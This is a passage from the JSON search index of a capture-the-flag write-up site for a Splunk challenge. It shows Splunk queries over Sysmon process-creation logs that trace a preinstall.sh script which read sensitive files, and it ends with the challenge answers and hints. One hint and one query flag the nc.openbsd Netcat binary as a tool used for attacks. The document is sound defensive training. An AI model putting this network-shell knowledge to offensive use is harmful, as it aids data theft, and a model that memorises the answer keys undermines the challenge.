source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where Image=\"/usr/bin/nc.openbsd\" | table Image CommandLine ParentImage ParentProcessId Next, we use process ID 6788 to search for any other processes that have the same parent process ID (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ParentProcessId=6788 | table Image CommandLine ParentProcessId It looks like 6 different files were accessed using a single cat command. Answer 6 Task 8 \u2693\ufe0e Question Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. The final task is similar to the previous one. We need to move up the process tree by alternating our searches between finding the parent process ID for the current process and using that value as the input for the next search, and the next, etc. Start with process ID 6788 from the previous task (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6788 | table Image ProcessId CommandLine ParentImage ParentProcessId Use process ID 6784 as input for the next search and grab its parent process ID (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6784 | table Image ProcessId CommandLine ParentImage ParentProcessId A final search for process ID 6783 gives us the preinstall.sh Bash script we're looking for! Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6783 | table Image ProcessId CommandLine ParentImage ParentProcessId Answer preinstall.sh Gee whiz, we made it! \u2693\ufe0e Answer whiz","title":"Splunk!"},{"location":"objectives/o9/#splunk","text":"Difficulty : Direct link : splunk website Terminal hint : Yara Analysis","title":"Splunk!"},{"location":"objectives/o9/#objective","text":"Request Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis? Angel Candysalt Greetings North Pole visitor! I'm Angel Candysalt! A euphemism? No, that's my name. Why do people ask me that? Anywho, I'm back at Santa's Splunk terminal again this year. There's always more to learn! Take a look and see what you can find this year. With who-knows-what going on next door, it never hurts to have sharp SIEM skills!","title":"Objective"},{"location":"objectives/o9/#hints","text":"GitHub Monitoring in Splunk Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . Sysmon Monitoring in Splunk Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Malicious NetCat?? Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example.","title":"Hints"},{"location":"objectives/o9/#solution","text":"","title":"Solution"}]}